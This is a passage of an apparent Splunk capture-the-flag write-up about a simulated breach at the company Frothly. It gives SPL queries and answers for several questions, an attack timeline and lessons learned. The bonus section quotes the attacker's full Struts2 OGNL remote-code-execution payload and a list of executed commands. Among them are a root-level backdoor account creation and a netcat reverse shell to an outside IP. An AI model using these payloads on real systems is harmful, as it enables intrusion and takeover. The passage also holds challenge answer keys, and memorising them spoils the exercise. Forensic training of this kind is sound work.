| table _time sa da liuidp ppn pn dh
```

40 events, featuring *BudStoll* (x25), *MalloryKraeusen* (x10), *PeatCerf* (x1) and *unknown* (x4). All connect to 24.8.40.284 "*vpn.froth.ly*". Processes include *vpnui.exe*, *vpndownloader.exe*, and *vpnagent.exe*. Good info, but nothing on actual traffic generation.

However, there is another Cisco sourcetype - with >80k events:

```bash
sourcetype="cisco:asa"
```

This does have traffic data as `bytes`. There are 4 `action` values - blocked, teardown, allowed, and success. The only `action` with `bytes` is teardown - the others are presumably for making the connection → >20k events

```bash
sourcetype="cisco:asa" action="teardown"
```

Now the `src_ip`, of which there are 80.

```bash
sourcetype="cisco:asa" action="teardown"
| stats sum(bytes) as traffic by src_ip
| sort -traffic
```

The top IPs are 34.215.24.225, 107.77.212.175, then 192.168.8.117. Search each individually to see what they are. The first looks to be Splunk , the second looks to be AWS, and the third looks to be *MKRAEUS-L* a.k.a Mallory Kraeusen. Check with the VPN traffic, as each event also notes the user in brackets.

```bash
sourcetype="cisco:asa" action="teardown" src_ip="192.168.8.117"
```

> mkraeusen

<br><br>

### 331 -|- Using Splunk commands only, what is the upper fence (UF) value of the interquartile range (IQR) of the count of event code 4688 by Windows hosts over the entire day? Use a 1.5 multiplier.

Start with the event code (7427 events), then do some maths.

IQR is the 75th percentile minus the 25th percentile.

```bash
sourcetype="wineventlog" EventCode="4688"
| stats count by host
| eventstats perc25(count) as p25, perc75(count) as p75
| eval IQR=p75-p25
| eval UF=p75+1.5*IQR
```

> 1368

<br><br>

### 332 -|- What is the CVE of the vulnerability that escalated permissions on Linux host hoth?

From Q328, we know *colonel.c* was used for privesc by tomcat on hoth. Google the phrase "CVE Ubuntu 16.04.4 kernel priv esc" and we have the answer.

> CVE-2017-16995

<br><br>

### 333 -|- What is the CVE of the vulnerability that was exploited to run commands on Linux host hoth?

Again the Q328 search, the first command was `"/bin/bash -c whoami"` at 11:06:07, followed by several other commands. What happened just before this command, to allow the command to be run?

```bash
host="hoth" earliest="08/20/2018:11:05:08" latest="08/20/2018:11:06:08"
```

A lot - 554 events. Let's add "whoami" in.

```bash
host="hoth" earliest="08/20/2018:11:05:08" latest="08/20/2018:11:06:08" whoami
| reverse
```

Now only 3 events! The latter two are the same as the original command; the first is a `stream:http` request to */frothlyinventory/integration/saveGangster.action*. The `form_data` looks suspicious. Google "saveGangster.action" and we get our answer.

> CVE-2017-9791

**Bonus**

We saw *iexeplorer.exe* a few times in different questions, but what actually did it do?

```bash
iexeplorer.exe source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
  ParentImage="C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe"
| table _time CommandLine
| reverse

# OR

iexeplorer.exe source="WinEventLog:Security"
  Creator_Process_Name="C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe"
| table _time Process_Command_Line
| reverse
```

It seems the malicious file is used for remote code execution via *showcase.action* - also CVE-2017-9791. In other words, it's related to *saveGangster.action*. You can see the exact correlation:

```bash
(saveGangster.action OR iexeplorer.exe)
  ((source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
    AND ParentImage="C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe")
  OR source="stream:http")
| table _time CommandLine form_data
| reverse
```

11:05:40:

`"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action whoami`

11:05:43:

`"age=1&__checkbox_bustedBefore=true&name=${(#szgx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}&description=1"` (*saveGangster.action* `form_data`)

<br>

The list of RCEs using this method:

1. whoami
2. id
3. groups
4. "cat /etc/passwd"
5. "useradd -ou 0 -g 0 -M -N -r -s /bin/bash tomcat7 -p davidverve.com"
6. "uname -a"
7. "lsb_release -a"
8. "echo <string> >> /tmp/colonel"
9. "echo <string> >> /tmp/definitelydontinvestigatethisfile.sh"
10. "ls -lf /tmp"
11. "base64 --decode /tmp/colonel > /tmp/colonel.c"
12. "cat /tmp/colonel.c"
13. "md5sum /tmp/colonel.c"
14. "mknod /tmp/backpipe p"
15. "/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe"
16. "mknod /tmp/backpipe p"
17. "/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe"

## Timeline

*In Notion/the PDF theses are colour-coded by category - links at the top of this page.*

09:16:12: AKIAJOGCDXJ5NW5PXUPA/web_admin attempts to access IAM resources begin

09:16:12: AKIAJOGCDXJ5NW5PXUPA/web_admin attempts to create nullweb_admin

09:16:22: AKIAJOGCDXJ5NW5PXUPA/web_admin attempts to launch Xenial Xerus instance

09:16:55: Email stating AKIAJOGCDXJ5NW5PXUPA/web_admin was detected on GitHub

09:27:07: AKIAJOGCDXJ5NW5PXUPA/web_admin attempts to access IAM resources end

09:27:06: AKIAJOGCDXJ5NW5PXUPA/web_admin attempts to describe an account

09:55:14: Malicious attachment Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm

09:55:52: Sysmon detects HxTsr.exe from malicious attachment

09:56:39: Symantec detects HxTsr.exe from malicious attachment

09:57:17: stout.png, stout-2.png, morebeer.jpg uploaded to OneDrive

09:57:33: BRUCE BIRTHDAY HAPPY HOUR PICS.lnk uploaded to OneDrive

09:59:04: First time BRUCE BIRTHDAY HAPPY HOUR PICS.lnk was used

10:01:44: C2 server contacted

10:07:07: C2 server contacted

10:08:17: svcvnc Windows account created

10:08:17: svcvnc added to Administrators group

10:08:35: svcvnc added to Users group

10:11:02: C2 server contacted

10:15:28: C2 server contacted

10:43:10: hdoor.exe scans network

10:47:16: Attack tools logos.png downloaded from 45.77.53.176:3333

10:48:28: Search for "cromdale OR beer OR financial OR secret"

11:05:40: First remote code execution using iexeplorer.exe (CVE-2017-9791)

11:08:36: colonel file streamed using iexeplorer.exe

11:08:48: definitelydontinvestigatethisfile.sh file streamed using iexeplorer.exe

11:21:40: BCC rule to hyunki1984@naver.com added

11:24:28: Kevin Lagerfield Azure AD account activated

11:24:54: tomcat7 Linux account created

11:28:30: Last time BRUCE BIRTHDAY HAPPY HOUR PICS.lnk was used

11:31:54: netcat listening on port 1337 starts

11:32:14: C2 server contacted

11:34:01: Last remote code execution using iexeplorer.exe (CVE-2017-9791)

11:34:49: tomcat8 runs `./colonelnew` (priv esc to root, CVE-2017-16995)

11:41:36: Kevin Lagerfield Azure AD account password reset

11:42:51: Kevin Lagerfield Azure AD account password reset

11:43:22: Kevin Lagerfield Azure AD account password changed

11:48:38: root runs `rm /usr/share/tomcat8/.bash_history`

11:55:34: netcat listening on port 1337 ends

13:01:46: frothlywebcode S3 bucket made public

13:02:44: OPEN_BUCKET_PLEASE_FIX.txt uploaded to frothlywebcode 

13:04:17: frothly_html_memcached.tar.gz uploaded to frothlywebcode

13:33:24: gacrux.i-0cc93bade2b3cba63 autoscaled

13:37:33: BSTOLL-L Coinhive DNS lookup

13:37:40: First BTUN-L JSCoinMiner detection

13:37:50: BSTOLL-L Chrome Monero mining begins

13:46:47: Last BTUN-L JSCoinMiner detection

13:57:54: frothlywebcode S3 bucket made private

14:05:23: BSTOLL-L Chrome Monero mining ends

14:23:19: gacrux.i-06fea586f3d3c8ce8 autoscaled

14:25:21: gacrux.i-09cbc261e84259b54 autoscaled

14:47:12: Azure AD bgist@froth.ly disabled by fyodor@froth.ly

15:07:22: Brute force against web servers from 5.101.40.81 starts

15:08:12: Brute force against web servers from 5.101.40.81 ends

15:11:35: Memcached attack start

15:27:09: Memcached attack end

15:15:00: Email bragging about customer data exfiltration

## Key Learnings

- Do initial recon on hosts, sources, and sourcetypes, to understand where you might find different types of data
- `FromBase64String` can often provide good results, ditto common Linux strings e.g. `whoami`
- Often searching key words/phrases will give you a lot more than you expect

<br><br>